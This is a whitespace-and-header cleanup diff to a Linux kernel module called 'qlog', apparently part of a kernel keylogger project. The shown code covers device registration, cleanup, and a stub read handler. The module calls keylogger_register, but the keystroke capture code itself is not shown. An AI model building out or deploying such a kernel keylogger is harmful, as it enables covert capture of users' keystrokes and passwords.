@@ -5,7 +5,7 @@
 #include <linux/fs.h>
 #include <asm/uaccess.h>
 
-#include "definitions.h"
+#include "logging.h"
 #include "keylogger.h"
 
 #define CLASS_NAME "qlog"
@@ -35,7 +35,7 @@ static volatile size_t s_numopen = 0;
 /**
  * Kernel module Initialisation function
  * @return Returns 0 if successful
- */ 
+ */
 static int __init qlog_init(void) {
     int retval = 0;
 
@@ -48,7 +48,7 @@ static int __init qlog_init(void) {
         &fops        // File operation
         );
 
-    // If failed return the error code. 
+    // If failed return the error code.
     if (s_major < 0) {
         LOG_ERROR("Failed to register device. Errno: %d\n", -s_major);
         retval = s_major;
@@ -60,24 +60,24 @@ static int __init qlog_init(void) {
         THIS_MODULE, // Parent module of the class
         CLASS_NAME   // Class name
         );
-    
-    // If create_class failed return the error 
+
+    // If create_class failed return the error
     if (IS_ERR(s_class)) {
         retval = PTR_ERR(s_class);
         LOG_ERROR("Failed to create_class. Errno: %d\n", retval);
         s_class = NULL;
         goto cleanup;
     }
-    
+
     // Register the device
     s_device = device_create(
         s_class,           // The device class
         NULL,              // The parent device (we have no parents)
-        MKDEV(s_major, 0), // 
+        MKDEV(s_major, 0), //
         NULL,              // Device data (none to pass)
         DEVICE_NAME        // The device name
         );
-    
+
     // If failed to create the device, return the error
     if (IS_ERR(s_device)) {
         retval = PTR_ERR(s_device);
@@ -95,7 +95,7 @@ static int __init qlog_init(void) {
         LOG_ERROR("Failed to register keylogger. Errno: %d\n", retval);
         goto cleanup;
     }
-    
+
     LOG_INFO("Keylogger initialised.\n");
 
     return retval;
@@ -109,9 +109,9 @@ cleanup:
 
     // Destroy the class
     if (s_class) {
-        class_destroy(s_class); 
+        class_destroy(s_class);
     }
-    
+
     // Unregister the device
     if (s_major >= 0) {
         unregister_chrdev(s_major, DEVICE_NAME);
@@ -123,11 +123,11 @@ cleanup:
 /**
  * Kernel module exit function
  * Free all resources and exit. This function assumes the module has
- * been initialised completely.  
+ * been initialised completely.
  */
 static void __exit qlog_exit(void) {
     LOG_INFO("Unloading device %s\n", DEVICE_NAME);
-    
+
     // Unregister the key logger
     keylogger_unregister();
 
@@ -143,13 +143,13 @@ static void __exit qlog_exit(void) {
     // Unregister the device
     unregister_chrdev(s_major, DEVICE_NAME);
 }
- 
+
 module_init(qlog_init);
 module_exit(qlog_exit);
 
 /**
  * Open device file operation
- * Returns 0. . 
+ * Returns 0. .
  */
 static int qlog_open(struct inode* inode, struct file* file) {
     LOG_INFO("qlog_open\n");
@@ -159,7 +159,7 @@ static int qlog_open(struct inode* inode, struct file* file) {
 /**
  * Device read file operation
  * Returns a message to the caller in 'buf' and the number of bytes copied. On error
- * a negative error code will be returned. 
+ * a negative error code will be returned.
  */
 static ssize_t qlog_read(struct file* file, char* buf, size_t len, loff_t* off) {
     const char message[] = "Hello from the kernel!";
@@ -171,7 +171,7 @@ static ssize_t qlog_read(struct file* file, char* buf, size_t len, loff_t* off) 
     if (len < messageLen) {
         return 0;
     }
-    
+
     // Copy the message to user mode
     errorCount = copy_to_user(
         buf,       // 'To' address in user mode
@@ -196,4 +196,3 @@ static int qlog_release(struct inode* inode, struct file* file) {
     LOG_INFO("qlog_release\n");
     return 0;
 }
-
